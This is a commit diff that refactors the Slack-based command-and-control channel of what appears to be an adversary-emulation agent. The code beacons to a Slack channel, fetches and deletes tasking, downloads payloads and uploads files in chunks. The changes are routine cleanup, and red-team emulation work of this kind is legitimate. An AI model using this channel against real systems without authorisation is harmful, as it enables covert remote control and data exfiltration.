b9339a6fa06d9b8ad61c44c23aa1fbeaee719f5e
Daniel Kim <kimd@mitre.org>
2022-02-10 14:31:23 -0500

    Refactoring to remove duplicate code and to cleanup

--- gocat-extensions/contact/slack.go
+++ gocat-extensions/contact/slack.go
@@ -27,26 +27,28 @@ const (
 	slackUploadFileEndpoint = "https://slack.com/api/files.upload"
 	slackPostMessageEndpoint = "https://slack.com/api/chat.postMessage"
 	slackHistoryEndpointTemplate = "https://slack.com/api/conversations.history?channel=%s&oldest=%d"
+	payloadsSlackType = "payloads"
+	instructionsSlackType = "instructions"
 )
 
 var (
-	slackToken = ""
 	channelId = "{SLACK_C2_CHANNEL_ID}"
 )
 
 type Slack struct {
 	name string
+	token string
 }
 
 func init() {
-	CommunicationChannels["Slack"] = Slack{ name: "Slack" }
+	CommunicationChannels["Slack"] = &Slack{ name: "Slack" }
 }
 
 //GetInstructions sends a beacon and returns instructions
-func (s Slack) GetBeaconBytes(profile map[string]interface{}) []byte {
+func (s *Slack) GetBeaconBytes(profile map[string]interface{}) []byte {
 	checkValidSleepInterval(profile, slackTimeout, slackTimeoutResetInterval)
 	var retBytes []byte
-	bites, heartbeat := slackBeacon(profile)
+	bites, heartbeat := s.slackBeacon(profile)
 	if heartbeat == true {
 		retBytes = bites
 	}
@@ -54,7 +56,7 @@ func (s Slack) GetBeaconBytes(profile map[string]interface{}) []byte {
 }
 
 //GetPayloadBytes load payload bytes
-func (s Slack) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
+func (s *Slack) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
 	output.VerbosePrint("[+] Attempting to retrieve payload...")
@@ -62,7 +64,7 @@ func (s Slack) GetPayloadBytes(profile map[string]interface{}, payloadName strin
 		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
 		return nil, ""
 	}
-	payloads := getSlacks("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
+	payloads := s.getSlackMessageContents(payloadsSlackType, fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
 	if payloads[0] != "" {
 		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
 		if err != nil {
@@ -74,10 +76,10 @@ func (s Slack) GetPayloadBytes(profile map[string]interface{}, payloadName strin
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (s Slack) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
+func (s *Slack) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
     config := make(map[string]string)
     if len(criteria["c2Key"]) > 0 {
-        slackToken = criteria["c2Key"]
+        s.token = criteria["c2Key"]
         if len(profile["paw"].(string)) == 0 {
         	config["paw"] = getRandomIdentifier()
         }
@@ -86,27 +88,27 @@ func (s Slack) C2RequirementsMet(profile map[string]interface{}, criteria map[st
     return false, nil
 }
 
-func (s Slack) SetUpstreamDestAddr(upstreamDestAddr string) {
+func (s *Slack) SetUpstreamDestAddr(upstreamDestAddr string) {
 	// Upstream destination will be the slack API.
 	return
 }
 
 //SendExecutionResults send results to the server
-func (s Slack) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
+func (s *Slack) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
 	profileCopy := make(map[string]interface{})
 	for k,v := range profile {
 		profileCopy[k] = v
 	}
 	results := [1]map[string]interface{}{result}
 	profileCopy["results"] = results
-	slackResults(profileCopy)
+	s.slackResults(profileCopy)
 }
 
-func (s Slack) GetName() string {
+func (s *Slack) GetName() string {
 	return s.name
 }
 
-func (s Slack) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
+func (s *Slack) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
 	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
 	paw := profile["paw"].(string)
 
@@ -123,7 +125,7 @@ func (s Slack) UploadFileBytes(profile map[string]interface{}, uploadName string
 		}
 		chunk := data[start:end]
 		slackDescription := getSlackDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
-		if err := uploadFileChunkSlack(slackName, slackDescription, chunk); err != nil {
+		if err := s.uploadFileChunkSlack(slackName, slackDescription, chunk); err != nil {
 			return err
 		}
 		start += slackMaxDataChunkSize
@@ -139,20 +141,20 @@ func getSlackDescriptionForUpload(uploadId string, encodedFilename string, chunk
 	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
 }
 
-func uploadFileChunkSlack(slackName string, slackDescription string, data []byte) error {
+func (s *Slack) uploadFileChunkSlack(slackName string, slackDescription string, data []byte) error {
 	output.VerbosePrint("[-] Uploading file...")
-	if result := createSlackContent(slackName, slackDescription, data); result != true {
+	if result := s.createSlackContent(slackName, slackDescription, data); result != true {
 		return errors.New(fmt.Sprintf("Failed to create file upload Slack. Response code: %t", result))
 	}
 	return nil
 }
 
-func slackBeacon(profile map[string]interface{}) ([]byte, bool) {
+func (s *Slack) slackBeacon(profile map[string]interface{}) ([]byte, bool) {
 	failCount := 0
-	heartbeat := createHeartbeatSlack("beacon", profile)
+	heartbeat := s.createHeartbeatSlack("beacon", profile)
 	if heartbeat {
 		for failCount < slackBeaconResponseFailThreshold {
-			contents := getSlackMessages("instructions", profile["paw"].(string));
+			contents := s.getSlackMessageContents(instructionsSlackType, profile["paw"].(string));
 			if contents != nil {
 				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
 				if err != nil {
@@ -169,7 +171,7 @@ func slackBeacon(profile map[string]interface{}) ([]byte, bool) {
 	return nil, heartbeat
 }
 
-func createHeartbeatSlack(slackType string, profile map[string]interface{}) bool {
+func (s *Slack) createHeartbeatSlack(slackType string, profile map[string]interface{}) bool {
 	data, err := json.Marshal(profile)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack heartbeat. Error with profile marshal: %s", err.Error()))
@@ -179,7 +181,7 @@ func createHeartbeatSlack(slackType string, profile map[string]interface{}) bool
 		paw := profile["paw"].(string)
 		slackName := getDescriptor(slackType, paw)
 		slackDescription := slackName
-		if createSlack(slackName, slackDescription, data) != true {
+		if s.createSlack(slackName, slackDescription, data) != true {
 			output.VerbosePrint("[-] Heartbeat Slack: FAILED")
 			return false
 		}
@@ -188,7 +190,7 @@ func createHeartbeatSlack(slackType string, profile map[string]interface{}) bool
 	return true
 }
 
-func slackResults(result map[string]interface{}) {
+func (s *Slack) slackResults(result map[string]interface{}) {
 	data, err := json.Marshal(result)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack results. Error with result marshal: %s", err.Error()))
@@ -197,7 +199,7 @@ func slackResults(result map[string]interface{}) {
 		paw := result["paw"].(string)
 		slackName := getDescriptor("results", paw)
 		slackDescription := slackName
-		if createSlack(slackName, slackDescription, data) != true {
+		if s.createSlack(slackName, slackDescription, data) != true {
 			output.VerbosePrint("[-] Results Slack: FAILED")
 		} else {
 			output.VerbosePrint("[+] Results Slack: SUCCESS")
@@ -205,7 +207,7 @@ func slackResults(result map[string]interface{}) {
 	}
 }
 
-func createSlackContent(slackName string, description string, data []byte) bool {
+func (s *Slack) createSlackContent(slackName string, description string, data []byte) bool {
 	stringified := base64.StdEncoding.EncodeToString(data)
 	requestBody := url.Values{}
     requestBody.Set("channels", channelId)
@@ -213,139 +215,103 @@ func createSlackContent(slackName string, description string, data []byte) bool 
 	requestBody.Set("content", stringified)
 
 	var result map[string]interface{}
-	json.Unmarshal(postFormWithAuth(slackUploadFileEndpoint, requestBody), &result);
+	json.Unmarshal(s.postFormWithAuth(slackUploadFileEndpoint, requestBody), &result);
 
 	return result["ok"].(bool);
 }
 
-
-func createSlack(slackName string, description string, data []byte) bool {
+func (s *Slack) createSlack(slackName string, description string, data []byte) bool {
 	stringified := base64.StdEncoding.EncodeToString(data)
 	slackText := fmt.Sprintf("%s | %s", slackName, stringified);
 	requestBody, err := json.Marshal(map[string]string{
 		"channel": channelId,
 		"text": slackText,
 	})
-	
+
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
 		return false
 	}
-	
+
 	var result map[string]interface{}
-	json.Unmarshal(postRequestWithAuth(slackPostMessageEndpoint, requestBody), &result);
+	json.Unmarshal(s.postRequestWithAuth(slackPostMessageEndpoint, requestBody), &result);
 
 	return result["ok"].(bool);
 }
 
-func getSlackMessages(slackType string, uniqueID string) []string {
+func (s *Slack) getSlackMessageContents(slackType string, uniqueID string) []string {
 	var contents []string
-	var msgs []byte
-
 	var result map[string]interface{}
-	msgs = getRequestWithAuth(fmt.Sprintf(slackHistoryEndpointTemplate, channelId, time.Now().Unix()-slackTimeout*2))
-	json.Unmarshal(msgs, &result);
-
+	response := s.getRequestWithAuth(fmt.Sprintf(slackHistoryEndpointTemplate, channelId, getHistoricTimeLimit()))
+	json.Unmarshal(response, &result);
 	if result["ok"] == false {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", msgs))
+		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", string(response)))
 		return contents
 	}
-
-	for i := range result["messages"].([]interface{}) {
-		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
+	result_msgs := result["messages"].([]interface{})
+	for _, msg := range result_msgs {
+        msg_map := msg.(map[string]interface{})
+		text := msg_map["text"]
 		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
-			contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
-			requestBody, err := json.Marshal(map[string]interface{}{
-				"channel":channelId,
-				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
-			})
-			
-			if err != nil {
-				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
-			}
-
-			if (!strings.Contains(slackType,"payloads")) {
-				postRequestWithAuth(slackDeleteEndpoint, requestBody);
+			if slackType == payloadsSlackType {
+				urlFile := msg_map["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
+				contents = append(contents, fmt.Sprintf("%s", s.getRequestWithAuth(urlFile)))
+			} else if slackType == instructionsSlackType {
+				contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
+				requestBody, err := json.Marshal(map[string]interface{}{
+					"channel": channelId,
+					"ts": msg_map["ts"],
+				})
+				if err != nil {
+					output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
+				} else {
+					s.postRequestWithAuth(slackDeleteEndpoint, requestBody);
+				}
 			}
 		}
 	}
 	return contents
 }
 
-func getSlacks(slackType string, uniqueID string) []string {
-	var contents []string
-	var urlFile string
-	var msgs []byte
-
-	var result map[string]interface{}
-	msgs = getRequestWithAuth(fmt.Sprintf(slackHistoryEndpointTemplate, channelId, time.Now().Unix()-slackTimeout*2))
-	json.Unmarshal(msgs, &result);
-
-	if result["ok"] == false {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", msgs))
-		return contents
-	}
-
-	for i := range result["messages"].([]interface{}) {
-		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
-		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
-			urlFile = result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
-			contents = append(contents, fmt.Sprintf("%s", getRequestWithAuth(urlFile)))
-			
-			requestBody, err := json.Marshal(map[string]interface{}{
-				"channel":channelId,
-				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
-			})
-			
-			if err != nil {
-				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
-			}
-
-			if (!strings.Contains(slackType,"payloads")) {
-				postRequestWithAuth(slackDeleteEndpoint, requestBody);
-			}
-		}
-	}
-	return contents
-}
-
-func postRequestWithAuth(address string, data []byte) []byte {
+func (s *Slack) postRequestWithAuth(address string, data []byte) []byte {
 	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
-	req.Header.Set("Authorization", "Bearer " + slackToken)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
+		return nil
+	}
+	req.Header.Set("Authorization", s.getAuthHeaderValue())
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("charset", "utf-8")
-	
+	return performHttpRequest(req)
+}
+
+func (s *Slack) postFormWithAuth(address string, data url.Values) []byte {
+	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
 		return nil
 	}
-	timeout := time.Duration(slackTimeout * time.Second)
-	client := http.Client{
-		Timeout: timeout,
-	}
-	resp, err := client.Do(req)
-	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
-		return nil
-	}
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
-		return nil
-	}
-	return body
-}
-
-func postFormWithAuth(address string, data url.Values) []byte {
-	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
-	req.Header.Set("Authorization", "Bearer " + slackToken)
+	req.Header.Set("Authorization", s.getAuthHeaderValue())
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("charset", "utf-8")
-	
+	return performHttpRequest(req)
+}
+
+func (s *Slack) getRequestWithAuth(address string) []byte {
+	req, err := http.NewRequest("GET", address, nil)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
 		return nil
 	}
+	req.Header.Set("Authorization", s.getAuthHeaderValue())
+	return performHttpRequest(req)
+}
+
+func (s *Slack) getAuthHeaderValue() string {
+	return "Bearer " + s.token
+}
+
+func performHttpRequest(req *http.Request) []byte {
 	timeout := time.Duration(slackTimeout * time.Second)
 	client := http.Client{
 		Timeout: timeout,
@@ -363,26 +329,6 @@ func postFormWithAuth(address string, data url.Values) []byte {
 	return body
 }
 
-func getRequestWithAuth(address string) []byte {
-	req, err := http.NewRequest("GET", address, nil)
-	req.Header.Set("Authorization", "Bearer " + slackToken)
-	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
-		return nil
-	}
-	timeout := time.Duration(slackTimeout * time.Second)
-	client := http.Client{
-		Timeout: timeout,
-	}
-	resp, err := client.Do(req)
-	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
-		return nil
-	}
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
-		return nil
-	}
-	return body
+func getHistoricTimeLimit() int64 {
+	return time.Now().Unix()-slackTimeout*2
 }
